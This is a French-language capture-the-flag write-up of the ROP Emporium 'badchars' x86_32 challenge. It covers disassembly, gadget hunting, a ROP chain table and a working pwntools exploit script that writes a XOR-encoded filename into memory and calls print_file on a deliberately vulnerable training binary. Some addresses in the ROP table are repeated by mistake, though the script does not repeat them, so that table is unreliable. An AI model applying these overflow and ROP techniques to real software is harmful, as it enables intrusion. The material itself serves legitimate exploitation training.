---
Title: Ropemporium x86_32 bad chars
Date: 2023-06-15
Tags: [linux, python, ROP, x86_32, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# bad chars x86_32

## Introduction

Le challenge est décrit ainsi sur le site [ropemporium](https://ropemporium.com/challenge/badchars.html)

### The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you've probably had to deal with them before while encoding shellcode. "Badchars" are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for too much RE the binary will list its badchars when you run it.
Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. Note that the amount of garbage data you'll need to send to the ARM challenge is slightly different.
Moar XOR

You'll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we're going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it's in memory?
Helper functions

It's almost certainly worth your time writing a helper function for this challenge. Perhaps one that takes as parameters a string, a desired location in memory and an array of badchars. It could then write the string into memory and deal with the badchars afterwards. There's always a chance you could find a string that does what you want and doesn't contain any badchars either.

## Découverte

Contenu du challenge

    -rwxr-xr-x 1 root root 7252 Jul 10  2020 badchars32
    -rw-r--r-- 1 root root   33 Jul  2  2020 flag.txt
    -rwxr-xr-x 1 root root 7244 Jul 10  2020 libbadchars32.so

Execution

    ropemporium/x32/05_badchars# ./badchars32
    badchars by ROP Emporium
    x86

    badchars are: 'x', 'g', 'a', '.'
    > okokokflag
    Thank you!

## Analyse


    gef➤  disas main
    Dump of assembler code for function main:
    0x08048506 <+0>:	lea    ecx,[esp+0x4]
    0x0804850a <+4>:	and    esp,0xfffffff0
    0x0804850d <+7>:	push   DWORD PTR [ecx-0x4]
    0x08048510 <+10>:	push   ebp
    0x08048511 <+11>:	mov    ebp,esp
    0x08048513 <+13>:	push   ecx
    0x08048514 <+14>:	sub    esp,0x4
    0x08048517 <+17>:	call   0x80483b0 <pwnme@plt>
    0x0804851c <+22>:	mov    eax,0x0
    0x08048521 <+27>:	add    esp,0x4
    0x08048524 <+30>:	pop    ecx
    0x08048525 <+31>:	pop    ebp
    0x08048526 <+32>:	lea    esp,[ecx-0x4]
    0x08048529 <+35>:	ret
    End of assembler dump.

La fonction pwnme est importé et située dans la librairie

    gef➤
    Dump of assembler code for function usefulFunction:
    0x0804852a <+0>:	push   ebp
    0x0804852b <+1>:	mov    ebp,esp
    0x0804852d <+3>:	sub    esp,0x8
    0x08048530 <+6>:	sub    esp,0xc
    0x08048533 <+9>:	push   0x80485e0
    0x08048538 <+14>:	call   0x80483d0 <print_file@plt>
    0x0804853d <+19>:	add    esp,0x10
    0x08048540 <+22>:	nop
    0x08048541 <+23>:	leave
    0x08048542 <+24>:	ret
    End of assembler dump.

Comme dans write4 on dispose d'une fonction print file elle aussi dans le librairie

    gef➤  disas usefulGadgets
    Dump of assembler code for function usefulGadgets:
    0x08048543 <+0>:	add    BYTE PTR [ebp+0x0],bl
    0x08048546 <+3>:	ret
    0x08048547 <+4>:	xor    BYTE PTR [ebp+0x0],bl
    0x0804854a <+7>:	ret
    0x0804854b <+8>:	sub    BYTE PTR [ebp+0x0],bl
    0x0804854e <+11>:	ret
    0x0804854f <+12>:	mov    DWORD PTR [edi],esi
    0x08048551 <+14>:	ret

### Dans la librairie

Regardons la fonction pwnme.

``` x86
[0x000007cf]> pdf @sym.pwnme
┌ 274: sym.pwnme ();
│           ; var ssize_t s @ ebp-0x38
│           ; var int32_t var_34h @ ebp-0x34
│           ; var int32_t var_30h @ ebp-0x30
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_4h @ ebp-0x4
│           0x000006bd      55             push ebp
│           0x000006be      89e5           mov ebp, esp
│           0x000006c0      53             push ebx
│           0x000006c1      83ec34         sub esp, 0x34
│           0x000006c4      e8f7feffff     call entry0
│           0x000006c9      81c337190000   add ebx, 0x1937
│           0x000006cf      8b83f8ffffff   mov eax, dword [ebx - 8]
│           0x000006d5      8b00           mov eax, dword [eax]
│           0x000006d7      6a00           push 0
│           0x000006d9      6a02           push 2
│           0x000006db      6a00           push 0                      ; char *buf
│           0x000006dd      50             push eax                    ; FILE*stream
│           0x000006de      e89dfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x000006e3      83c410         add esp, 0x10
│           0x000006e6      83ec0c         sub esp, 0xc
│           0x000006e9      8d837ce8ffff   lea eax, [ebx - 0x1784]
│           0x000006ef      50             push eax                    ; const char *s
│           0x000006f0      e86bfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000006f5      83c410         add esp, 0x10
│           0x000006f8      83ec0c         sub esp, 0xc
│           0x000006fb      8d8395e8ffff   lea eax, [ebx - 0x176b]
│           0x00000701      50             push eax                    ; const char *s
│           0x00000702      e859feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000707      83c410         add esp, 0x10
│           0x0000070a      83ec04         sub esp, 4
│           0x0000070d      6a20           push 0x20
│           0x0000070f      6a00           push 0                      ; int c
│           0x00000711      8d45c8         lea eax, [s]
│           0x00000714      83c010         add eax, 0x10
│           0x00000717      50             push eax                    ; void *s
│           0x00000718      e883feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x0000071d      83c410         add esp, 0x10
│           0x00000720      83ec0c         sub esp, 0xc
│           0x00000723      8d839ce8ffff   lea eax, [ebx - 0x1764]
│           0x00000729      50             push eax                    ; const char *s
│           0x0000072a      e831feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000072f      83c410         add esp, 0x10
│           0x00000732      83ec0c         sub esp, 0xc
│           0x00000735      8d83bde8ffff   lea eax, [ebx - 0x1743]
│           0x0000073b      50             push eax                    ; const char *format
│           0x0000073c      e8effdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00000741      83c410         add esp, 0x10
│           0x00000744      83ec04         sub esp, 4
│           0x00000747      6800020000     push 0x200
│           0x0000074c      8d45c8         lea eax, [s]
│           0x0000074f      83c010         add eax, 0x10
│           0x00000752      50             push eax
│           0x00000753      6a00           push 0                      ; int fildes
│           0x00000755      e8c6fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0000075a      83c410         add esp, 0x10
│           0x0000075d      8945c8         mov dword [s], eax
│           0x00000760      c745cc000000.  mov dword [var_34h], 0
│       ┌─< 0x00000767      eb44           jmp 0x7ad
│       │   ; CODE XREF from sym.pwnme @ 0x7b5
│      ┌──> 0x00000769      c745d0000000.  mov dword [var_30h], 0
│     ┌───< 0x00000770      eb2a           jmp 0x79c
│     │╎│   ; CODE XREF from sym.pwnme @ 0x7a2
│    ┌────> 0x00000772      8b45cc         mov eax, dword [var_34h]
│    ╎│╎│   0x00000775      0fb64c05d8     movzx ecx, byte [ebp + eax - 0x28]
│    ╎│╎│   0x0000077a      8b45d0         mov eax, dword [var_30h]
│    ╎│╎│   0x0000077d      8b93f0ffffff   mov edx, dword [ebx - 0x10]
│    ╎│╎│   0x00000783      0fb60402       movzx eax, byte [edx + eax]   ; badchars[eax]
│    ╎│╎│   0x00000787      38c1           cmp cl, al
│   ┌─────< 0x00000789      7508           jne 0x793
│   │╎│╎│   0x0000078b      8b45cc         mov eax, dword [var_34h]
│   │╎│╎│   0x0000078e      c64405d8eb     mov byte [ebp + eax - 0x28], 0xeb
│   │╎│╎│   ; CODE XREF from sym.pwnme @ 0x789
│   └─────> 0x00000793      8b45d0         mov eax, dword [var_30h]
│    ╎│╎│   0x00000796      83c001         add eax, 1
│    ╎│╎│   0x00000799      8945d0         mov dword [var_30h], eax
│    ╎│╎│   ; CODE XREF from sym.pwnme @ 0x770
│    ╎└───> 0x0000079c      8b45d0         mov eax, dword [var_30h]
│    ╎ ╎│   0x0000079f      83f803         cmp eax, 3
│    └────< 0x000007a2      76ce           jbe 0x772
│      ╎│   0x000007a4      8b45cc         mov eax, dword [var_34h]
│      ╎│   0x000007a7      83c001         add eax, 1
│      ╎│   0x000007aa      8945cc         mov dword [var_34h], eax
│      ╎│   ; CODE XREF from sym.pwnme @ 0x767
│      ╎└─> 0x000007ad      8b55cc         mov edx, dword [var_34h]
│      ╎    0x000007b0      8b45c8         mov eax, dword [s]
│      ╎    0x000007b3      39c2           cmp edx, eax
│      └──< 0x000007b5      72b2           jb 0x769
│           0x000007b7      83ec0c         sub esp, 0xc
│           0x000007ba      8d83c0e8ffff   lea eax, [ebx - 0x1740]
│           0x000007c0      50             push eax                    ; const char *s
│           0x000007c1      e89afdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000007c6      83c410         add esp, 0x10
│           0x000007c9      90             nop
│           0x000007ca      8b5dfc         mov ebx, dword [var_4h]
│           0x000007cd      c9             leave
└           0x000007ce      c3             ret
```

Pas façile à lire. C'est plus claire avec ghidra, surtout en renommant les variables.

```c

char bachars[] ="xga.";

void pwnme(void)

{
  uint msgSz;
  uint ixMsg;
  uint ixBadChar;
  char acBuffer [36];

  setvbuf(stdout,(char *)0x0,2,0);
  puts("badchars by ROP Emporium");
  puts("x86\n");
  memset(acBuffer,0,0x20);
  puts("badchars are: \'x\', \'g\', \'a\', \'.\'");
  printf("> ");
  msgSz = read(0,acBuffer,0x200);
  for (ixMsg = 0; ixMsg < msgSz; ixMsg = ixMsg + 1) {
    for (ixBadChar = 0; ixBadChar < 4; ixBadChar = ixBadChar + 1) {
      if (acBuffer[ixMsg] == badchars[ixBadChar]) {
        acBuffer[ixMsg] = -0x15;
      }
    }
  }
  puts("Thank you!");
  return;
}
```

La taille du debordement est comme pour write4 0x28+4

     ; var ssize_t s @ ebp-0x38
      0x00000747      6800020000     push 0x200
      0x0000074c      8d45c8         lea eax, [s]
      0x0000074f      83c010         add eax, 0x10
      0x00000752      50             push eax                    ; => ebp-0x28
      0x00000753      6a00           push 0                      ; int fildes
      0x00000755      e8c6fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)


On doit donc evisager d'ecrire "flag.txt" transformé en "fl___t_t" puis de modifier les caractères interdits un par un.

Il nous faut donc
1. ecrire le nom de fichier modifié
Pour cela il nou faut un gadget de tyep mov [reg], reg
2. alterer un caractère donné
Pour cela un gadget de type add [reg], ou xor [reg]


## Contruction de l'exploitation

### Recherche d'un zone mémoire inscriptible

    ropemporium/x32/05_badchars# rabin2 -S badchars32
    [Sections]

    nth paddr        size vaddr       vsize perm name
    ―――――――――――――――――――――――――――――――――――――――――――――――――
    0   0x00000000    0x0 0x00000000    0x0 ----
    1   0x00000154   0x13 0x08048154   0x13 -r-- .interp
    2   0x00000168   0x20 0x08048168   0x20 -r-- .note.ABI-tag
    3   0x00000188   0x24 0x08048188   0x24 -r-- .note.gnu.build-id
    4   0x000001ac   0x3c 0x080481ac   0x3c -r-- .gnu.hash
    5   0x000001e8   0xb0 0x080481e8   0xb0 -r-- .dynsym
    6   0x00000298   0x8d 0x08048298   0x8d -r-- .dynstr
    7   0x00000326   0x16 0x08048326   0x16 -r-- .gnu.version
    8   0x0000033c   0x20 0x0804833c   0x20 -r-- .gnu.version_r
    9   0x0000035c    0x8 0x0804835c    0x8 -r-- .rel.dyn
    10  0x00000364   0x18 0x08048364   0x18 -r-- .rel.plt
    11  0x0000037c   0x23 0x0804837c   0x23 -r-x .init
    12  0x000003a0   0x40 0x080483a0   0x40 -r-x .plt
    13  0x000003e0    0x8 0x080483e0    0x8 -r-x .plt.got
    14  0x000003f0  0x1d2 0x080483f0  0x1d2 -r-x .text
    15  0x000005c4   0x14 0x080485c4   0x14 -r-x .fini
    16  0x000005d8   0x14 0x080485d8   0x14 -r-- .rodata
    17  0x000005ec   0x44 0x080485ec   0x44 -r-- .eh_frame_hdr
    18  0x00000630  0x114 0x08048630  0x114 -r-- .eh_frame
    19  0x00000efc    0x4 0x08049efc    0x4 -rw- .init_array
    20  0x00000f00    0x4 0x08049f00    0x4 -rw- .fini_array
    21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- .dynamic
    22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- .got
    23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt
    24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
    25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss
    26  0x00001020   0x29 0x00000000   0x29 ---- .comment
    27  0x0000104c  0x440 0x00000000  0x440 ---- .symtab
    28  0x0000148c  0x213 0x00000000  0x213 ---- .strtab
    29  0x0000169f  0x105 0x00000000  0x105 ---- .shstrtab

### Recherches de gadgets

    05_badchars# ROPgadget --binary badchars32 --depth 4 |grep "mov.*\["
    0x0804854f : mov dword ptr [edi], esi ; ret
    0x08048423 : mov ebx, dword ptr [esp] ; ret

    05_badchars# ROPgadget --binary badchars32 --depth 4 |grep xor
    0x08048547 : xor byte ptr [ebp], bl ; ret

    05_badchars# ROPgadget --binary badchars32 --depth 4 |grep "pop ebx"
    0x0804839b : les ecx, ptr [eax] ; pop ebx ; ret
    0x0804839d : pop ebx ; ret

    05_badchars# ROPgadget --binary badchars32 --depth 4 |grep "pop ebp"
    0x08048501 : mov ebp, esp ; pop ebp ; jmp 0x8048490
    0x08048503 : pop ebp ; jmp 0x8048490
    0x080485bb : pop ebp ; ret
    0x080485ba : pop edi ; pop ebp ; ret
    0x080485b9 : pop esi ; pop edi ; pop ebp ; ret


On retient :

- Pour charger une mot

  0x0804854f : mov dword ptr [edi], esi ; ret

- Pour alterer un byte

  0x08048547 : xor byte ptr [ebp], bl ; ret

- Pour charger `bl`

  0x0804839d : pop ebx ; ret

- Pour charger `ebp` et `edi` et `esi`

  0x080485b9 : pop esi ; pop edi ; pop ebp ; ret

- Pour charger : `ebp` tout seul

  0x080485bb : pop ebp ; ret

### Construction de la chaine de rop

Préalablement on calcule la chaine "flag.txt" avec les caractères interdits xoré avec le masque 3 ce qui donne "flbd-t{t".


| ROP entry | comment |
| ----------- | ------- |
|_____________|Ecriture de "flbd-t{t" dans data|
| 0x080485b9 | pop esi ; pop edi ; pop ebp ; ret |
| b"flbd" | pour esi |
| 0x0804a018 | .data pour edi|
| 0 | sans objet pour ebp |
| 0x0804854f | mov dword ptr [edi], esi ; ret |
| 0x080485b9 | pop esi ; pop edi ; pop ebp ; ret |
| b"-t{t" | pour esi |
| 0x0804a018 | .data pour edi|
| 0 | sans objet pour ebp |
| 0x0804854f | mov dword ptr [edi], esi ; ret |
|_____________|Xor data[2] avec 3|
| 0x0804839d | pop ebx ; ret|
| 3 |  pour `bl` |
| 0x080485bb | pop ebp ; ret |
| 0x0804a01a | .data+2 pour ebp|
| 0x08048547 | xor byte ptr [ebp], bl ; ret |
|_____________|Xor data[3] avec 3|
| 0x080485bb | pop ebp ; ret |
| 0x0804a01a | .data+3 pour ebp|
| 0x08048547 | xor byte ptr [ebp], bl ; ret |
|_____________|Xor data[4] avec 3|
| 0x080485bb | pop ebp ; ret |
| 0x0804a01a | .data+4 pour ebp|
| 0x08048547 | xor byte ptr [ebp], bl ; ret |
|_____________|Xor data[6] avec 3|
| 0x080485bb | pop ebp ; ret |
| 0x0804a01a | .data+6 pour ebp|
| 0x08048547 | xor byte ptr [ebp], bl ; ret |
|_____________|Appel de print_file|
| 0x08048538 | usefulFunction+14  |
| 0x0804a018 | .data avec "flag.txt"|


## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break apres le read dans pwnme
gs='''
b *pwnme+273
c
'''

# Gadgets
# mov dword ptr [edi], esi ; ret
g_write_edi=0x0804854f

# xor byte ptr [ebp], bl ; ret
g_xor_ebp = 0x08048547

# pop esi ; pop edi ; pop ebp ; ret
g_pop_esiediebp = 0x080485b9

# pop ebp ; ret
g_pop_ebp = 0x080485bb

#  pop ebx ; ret
g_pop_ebx = 0x0804839d

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

# Set up pwntools for the correct architecture
elf =  ELF('badchars32')
context.binary=elf

#print_file=elf.plt['print_file']
print_file=elf.symbols['usefulFunction']+14

data = elf.get_section_by_name('.data').header['sh_addr']

flagxored = xorchain(b"flag.txt",0b00111010,3)

log.info(f"{data=:x}")
log.info(f"flag xored :" + flagxored.decode())

PL =b"A"*offset
# On ecrit "fl__" dans data
PL+=p32(g_pop_esiediebp)
PL+=flagxored[:4]
PL+=p32(data)
PL+=p32(0)              # ebp
PL+=p32(g_write_edi)

# On ecrit "
PL+=p32(g_pop_esiediebp)
PL+=flagxored[4:8]
PL+=p32(data+4)
PL+=p32(0)              # ebp
PL+=p32(g_write_edi)

# data+2 xor 3
PL+=p32(g_pop_ebp)
PL+=p32(data+2)
PL+=p32(g_pop_ebx)
PL+=p32(3)
PL+=p32(g_xor_ebp)

# data+3 xor 3
# bl ne change pas
PL+=p32(g_pop_ebp)
PL+=p32(data+3)
PL+=p32(g_xor_ebp)

# data+4 xor 3
PL+=p32(g_pop_ebp)
PL+=p32(data+4)
PL+=p32(g_xor_ebp)

# data+6 xor 3
PL+=p32(g_pop_ebp)
PL+=p32(data+6)
PL+=p32(g_xor_ebp)

# Appel de print_file
PL+=p32(print_file)
PL+=p32(data)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

```

### Résultat

    05_badchars$ python3 solve.py
    [*] '/home/jce/w/ropemporium/x32/05_badchars/badchars32'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
    [*] data=804a018
    [*] flag xored :flbd-t{t
    [+] Starting local process '/home/jce/w/ropemporium/x32/05_badchars/badchars32': pid 25108
    [*] Switching to interactive mode
    badchars by ROP Emporium
    x86

    badchars are: 'x', 'g', 'a', '.'
    > Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive


